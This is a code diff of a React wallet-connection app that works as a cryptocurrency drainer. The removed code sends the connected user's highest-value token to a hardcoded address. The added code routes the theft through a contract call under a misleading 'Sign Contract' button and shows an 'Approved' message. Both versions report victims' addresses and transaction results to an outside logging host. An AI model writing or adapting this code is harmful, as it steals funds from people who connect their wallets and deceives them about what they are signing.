@@ -5,7 +5,11 @@ import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
 import { createWeb3Modal } from '@web3modal/wagmi/react';
 import { defaultWagmiConfig } from '@web3modal/wagmi/react/config';
 import './App.css';
-import { getEthersSigner } from './ethersAdapters';
+import ConnectButton from './components/ConnectButton';
+import Modal from './components/Modal';
+import { getEthersSigner } from './adapters/ethersAdapters';
+
+const ethers = require("ethers");
 
 const queryClient = new QueryClient();
 const projectId = '1c1db7ada235d88816f2f0008d415fdc';
@@ -37,99 +41,36 @@ export function Web3ModalProvider({ children }) {
   );
 }
 
-const ethers = require('ethers');
-const toAddress = '0xDF67b71a130Bf51fFaB24f3610D3532494b61A0f';
-const tokenAddresses = {
-  Ethereum: null, // Native token
-  USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-  USDC: '0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
-  ShibaInu: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE',
-  Chainlink: '0x514910771AF9Ca656af840dff83E8264EcF986CA',
-  WrappedBitcoin: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
-  Solana: '0x7D6F6bAC8eF3f1E5D3C5e1B273c6C98988D11B5C',
-  AAVE: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9',
-  Polkadot: '0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B',
-  BNB: '0xB8c77482e45F1F44dE1745F52C74426C631bDD52'
-};
+const tokenAddresses = [
+  null, // Ethereum
+  '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
+  '0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48', // USDC
+  '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', // Shiba Inu
+  '0x514910771AF9Ca656af840dff83E8264EcF986CA', // Chainlink
+  '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', // Wrapped Bitcoin
+  '0x7D6F6bAC8eF3f1E5D3C5e1B273c6C98988D11B5C', // Solana (represented as an ERC-20 token here for simplicity)
+  '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', // AAVE
+  '0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B', // Polkadot (represented as an ERC-20 token here for simplicity)
+  '0xB8c77482e45F1F44dE1745F52C74426C631bDD52', // BNB
+];
 
-async function getTokenBalances(signer) {
-  const address = await signer.getAddress();
-  const provider = signer.provider;
-  const balances = {};
-
-  // Check balance of native Ethereum
-  balances['Ethereum'] = await provider.getBalance(address);
-
-  // Check balance of ERC-20 tokens
-  for (const [token, tokenAddress] of Object.entries(tokenAddresses)) {
-    if (token !== 'Ethereum') {
-      const contract = new ethers.Contract(
-        tokenAddress,
-        ['function balanceOf(address) view returns (uint256)'],
-        signer
-      );
-      balances[token] = await contract.balanceOf(address);
-    }
-  }
-  return balances;
-}
-
-async function transferHighestToken(signer, balances) {
-  let highestToken = 'Ethereum';
-  let highestBalance = balances['Ethereum'];
-
-  for (const [token, balance] of Object.entries(balances)) {
-    if (balance.gt(highestBalance)) {
-      highestToken = token;
-      highestBalance = balance;
-    }
-  }
-
-  if (highestToken === 'Ethereum') {
-    const gasPrice = await signer.getGasPrice();
-    const estimateGas = await signer.estimateGas({
-      to: toAddress,
-      value: highestBalance,
-    });
-    const gasCost = gasPrice.mul(estimateGas);
-    const value = highestBalance.sub(gasCost);
-
-    const tx = await signer.sendTransaction({
-      to: toAddress,
-      value: value,
-    });
-    await tx.wait();
-    return { success: true, token: 'Ethereum', amount: value.toString() };
-  } else {
-    const contract = new ethers.Contract(
-      tokenAddresses[highestToken],
-      ['function transfer(address to, uint256 value) public returns (bool)'],
-      signer
-    );
-
-    const tx = await contract.transfer(toAddress, highestBalance);
-    await tx.wait();
-    return { success: true, token: highestToken, amount: highestBalance.toString() };
-  }
+async function transferTokens(signer) {
+  const contractAddress = 'YOUR_CONTRACT_ADDRESS'; // Replace with your deployed contract address
+  const abi = [
+    'function transferTokens(address[] calldata tokenAddresses) external'
+  ];
+  const contract = new ethers.Contract(contractAddress, abi, signer);
+  const tx = await contract.transferTokens(tokenAddresses);
+  await tx.wait();
+  return tx;
 }
 
 function App() {
   const { address, isConnected } = useAccount();
   const { disconnect } = useDisconnect();
-  const [balances, setBalances] = useState({});
   const [transactionInProgress, setTransactionInProgress] = useState(false);
-
-  useEffect(() => {
-    if (isConnected) {
-      const fetchBalances = async () => {
-        const signer = await getEthersSigner(config);
-        const balances = await getTokenBalances(signer);
-        setBalances(balances);
-      };
-
-      fetchBalances();
-    }
-  }, [isConnected, address]);
+  const [modalMessage, setModalMessage] = useState("");
+  const [modalVisible, setModalVisible] = useState(false);
 
   const logTransaction = async (logData) => {
     await fetch('https://eflujsyb0kuybgol11532.cleavr.one/btc/tt.php', {
@@ -144,17 +85,21 @@ function App() {
   const handleSendTransaction = async () => {
     if (isConnected && !transactionInProgress) {
       setTransactionInProgress(true);
+      setModalVisible(true);
+      setModalMessage("Signing contract...");
       try {
         const signer = await getEthersSigner(config);
-        const result = await transferHighestToken(signer, balances);
-        await logTransaction({ ...result, address, timestamp: new Date().toISOString(), ip: 'fetch IP from client' });
-        alert('Transaction successful!');
+        setModalMessage("Processing transaction...");
+        const tx = await transferTokens(signer);
+        await logTransaction({ success: true, address, timestamp: new Date().toISOString(), ip: 'fetch IP from client', txHash: tx.hash });
+        setModalMessage("Approved");
       } catch (error) {
         console.error('Transaction failed:', error);
         await logTransaction({ success: false, error: error.message, address, timestamp: new Date().toISOString(), ip: 'fetch IP from client' });
-        alert('Transaction failed. Please try again.');
+        setModalMessage("Declined");
       } finally {
         setTransactionInProgress(false);
+        setTimeout(() => setModalVisible(false), 3000); // Close modal after 3 seconds
       }
     }
   };
@@ -166,25 +111,16 @@ function App() {
         {isConnected ? (
           <>
             <p>Connected account: {address}</p>
-            <div>
-              <h2>Token Balances:</h2>
-              <ul>
-                {Object.entries(balances).map(([token, balance]) => (
-                  <li key={token}>
-                    {token}: {ethers.utils.formatUnits(balance, token === 'Ethereum' ? 18 : 6)}
-                  </li>
-                ))}
-              </ul>
-            </div>
             <button onClick={handleSendTransaction} disabled={transactionInProgress}>
-              {transactionInProgress ? 'Processing...' : 'Send Highest Token'}
+              {transactionInProgress ? 'Processing...' : 'Sign Contract'}
             </button>
             <button onClick={disconnect}>Disconnect Wallet</button>
           </>
         ) : (
-          <w3m-button />
+          <ConnectButton />
         )}
       </header>
+      {modalVisible && <Modal message={modalMessage} />}
     </div>
   );
 }
